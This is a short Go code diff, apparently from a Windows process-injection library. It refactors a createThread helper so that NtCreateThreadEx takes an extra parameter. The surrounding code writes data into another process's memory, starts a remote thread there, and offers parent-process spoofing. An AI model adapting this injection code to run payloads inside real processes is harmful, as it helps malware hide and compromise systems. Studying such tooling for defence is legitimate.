@@ -127,7 +127,7 @@ func (c *Code) Start() error {
 	if _, err = writeMemory(c.owner, c.loc, c.Data); err != nil {
 		return c.stopWith(err)
 	}
-	if c.handle, err = createThread(c.owner, c.loc); err != nil {
+	if c.handle, err = createThread(c.owner, c.loc, 0); err != nil {
 		return c.stopWith(err)
 	}
 	go c.wait()
@@ -226,20 +226,6 @@ func (c *Code) SetParentRandomEx(s []string, e bool) {
 	c.container.elevated = e
 	c.SetParentRandom(s)
 }
-func createThread(h windows.Handle, a uintptr) (uintptr, error) {
-	var (
-		t         uintptr
-		r, _, err = funcNtCreateThreadEx.Call(
-			uintptr(unsafe.Pointer(&t)),
-			windows.GENERIC_ALL, 0,
-			uintptr(h), a, 0, 0, 0, 0, 0, 0,
-		)
-	)
-	if r > 0 {
-		return 0, xerr.Wrap("winapi NtCreateThreadEx error", err)
-	}
-	return t, nil
-}
 func allocateMemory(h windows.Handle, s uint32) (uintptr, error) {
 	var (
 		a         uintptr
@@ -254,6 +240,20 @@ func allocateMemory(h windows.Handle, s uint32) (uintptr, error) {
 		return 0, xerr.Wrap("winapi NtAllocateVirtualMemory error", err)
 	}
 	return a, nil
+}
+func createThread(h windows.Handle, a, p uintptr) (uintptr, error) {
+	var (
+		t         uintptr
+		r, _, err = funcNtCreateThreadEx.Call(
+			uintptr(unsafe.Pointer(&t)),
+			windows.GENERIC_ALL, 0,
+			uintptr(h), a, p, 0, 0, 0, 0, 0,
+		)
+	)
+	if r > 0 {
+		return 0, xerr.Wrap("winapi NtCreateThreadEx error", err)
+	}
+	return t, nil
 }
 func writeMemory(h windows.Handle, a uintptr, b []byte) (uint32, error) {
 	var (
